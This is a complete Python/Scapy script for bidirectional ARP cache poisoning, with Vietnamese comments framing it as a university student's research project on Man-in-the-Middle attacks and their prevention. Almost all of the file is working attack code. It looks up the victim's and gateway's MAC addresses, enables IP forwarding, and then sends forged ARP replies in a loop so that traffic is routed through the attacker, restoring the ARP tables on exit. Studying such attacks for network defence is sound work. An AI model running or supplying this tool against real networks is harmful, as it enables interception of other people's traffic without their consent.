#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Kịch bản Tấn công ARP Cache Poisoning Hai Chiều (Bidirectional ARP Spoofing)
Tác giả: Nguyễn Thị Kỳ Duyên (MSSV: 0023410647 - Lớp: ĐHCNTT23B-CS)
Đề tài: Nghiên cứu kỹ thuật khai thác và phòng chống tấn công Man-in-the-Middle
Cơ sở đào tạo: Trường Đại học Đồng Tháp (DTHU)

Cách dùng:
    sudo python3 arp_spoof.py -t 192.168.10.10 -g 192.168.10.1 -i eth0
"""

import argparse
import os
import signal
import sys
import time
from scapy.all import ARP, Ether, sendp, srp

def enable_ip_forwarding():
    """Kích hoạt tính năng IP Forwarding trên nhân Linux để chuyển tiếp gói tin."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
        print("[+] Đã kích hoạt IP Forwarding (net.ipv4.ip_forward = 1).")
    except Exception as e:
        print(f"[!] Cảnh báo: Không thể bật IP forwarding tự động: {e}")

def disable_ip_forwarding():
    """Hạ tính năng IP Forwarding về 0 khi kết thúc kịch bản."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0\n")
        print("[-] Đã tắt IP Forwarding.")
    except Exception:
        pass

def get_mac_address(ip, iface):
    """
    Phát gói tin ARP Request quảng bá để tìm địa chỉ MAC tương ứng với địa chỉ IP.
    """
    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
    answered, _ = srp(arp_broadcast, timeout=3, iface=iface, verbose=False)
    for sent, received in answered:
        return received.src
    return None

def send_spoof_packet(target_ip, target_mac, spoof_ip, iface):
    """
    Gửi gói tin ARP Reply (op=2) giả mạo tới target:
    Tuyên bố IP spoof_ip hiện đang tương ứng với MAC của máy tấn công.
    """
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=iface, verbose=False)

def restore_arp_tables(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    """
    Khôi phục bảng ARP Cache của Target và Gateway về trạng thái ánh xạ đúng đắn.
    """
    print("\n[*] Đang tiến hành khôi phục bảng ARP Cache về trạng thái chuẩn...")
    # Khôi phục cho Victim: Báo MAC thật của Gateway cho Victim
    pkt1 = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                       psrc=gateway_ip, hwsrc=gateway_mac)
    sendp(pkt1, count=5, iface=iface, verbose=False)

    # Khôi phục cho Gateway: Báo MAC thật của Victim cho Gateway
    pkt2 = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                        psrc=target_ip, hwsrc=target_mac)
    sendp(pkt2, count=5, iface=iface, verbose=False)
    print("[+] Hoàn tất khôi phục. Mạng của nạn nhân đã an toàn trở lại.")

def main():
    parser = argparse.ArgumentParser(description="Kịch bản thực nghiệm ARP Cache Poisoning hai chiều")
    parser.add_argument("-t", "--target", required=True, help="Địa chỉ IP của nạn nhân (Victim)")
    parser.add_argument("-g", "--gateway", required=True, help="Địa chỉ IP của Gateway/Router")
    parser.add_argument("-i", "--interface", default="eth0", help="Giao diện mạng phát gói tin (Mặc định: eth0)")
    parser.add_argument("-d", "--delay", type=float, default=2.0, help="Khoảng nghỉ giữa các đợt phát gói (giây, mặc định: 2.0)")
    args = parser.parse_args()

    victim_ip = args.target
    gateway_ip = args.gateway
    iface = args.interface
    delay = args.delay

    print("=" * 65)
    print("   CÔNG CỤ THỰC NGHIỆM ĐẦU ĐỘC ARP CACHE HAI CHIỀU (ARP SPOOFING)   ")
    print("   Đề tài: Nghiên cứu kỹ thuật khai thác & phòng chống MitM         ")
    print("=" * 65)

    if os.geteuid() != 0:
        print("[!] Lỗi: Bạn phải chạy script này với quyền root (sudo).")
        sys.exit(1)

    print(f"[*] Giao diện mạng đang dùng: {iface}")
    print(f"[*] Đang truy vấn địa chỉ MAC của Victim ({victim_ip})...")
    victim_mac = get_mac_address(victim_ip, iface)
    if not victim_mac:
        print(f"[!] Không tìm thấy địa chỉ MAC cho IP {victim_ip}. Vui lòng kiểm tra lại kết nối mạng.")
        sys.exit(1)
    print(f"[+] Tìm thấy Victim: {victim_ip} -> MAC: {victim_mac}")

    print(f"[*] Đang truy vấn địa chỉ MAC của Gateway ({gateway_ip})...")
    gateway_mac = get_mac_address(gateway_ip, iface)
    if not gateway_mac:
        print(f"[!] Không tìm thấy địa chỉ MAC cho Gateway {gateway_ip}.")
        sys.exit(1)
    print(f"[+] Tìm thấy Gateway: {gateway_ip} -> MAC: {gateway_mac}")

    enable_ip_forwarding()

    def signal_handler(sig, frame):
        restore_arp_tables(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        disable_ip_forwarding()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    print("\n[+] Bắt đầu gửi các gói tin đầu độc ARP Cache liên tục...")
    print("[*] Nhấn [Ctrl + C] bất cứ lúc nào để dừng và tự động khôi phục bảng ARP.")
    packet_count = 0

    try:
        while True:
            # Lừa Victim: Gateway 192.168.10.1 mang MAC của Attacker
            send_spoof_packet(victim_ip, victim_mac, gateway_ip, iface)
            # Lừa Gateway: Victim 192.168.10.10 mang MAC của Attacker
            send_spoof_packet(gateway_ip, gateway_mac, victim_ip, iface)
            packet_count += 2
            print(f"\r[*] Đã phát {packet_count} gói tin ARP Spoofing giả mạo thành công...", end="", flush=True)
            time.sleep(delay)
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    main()
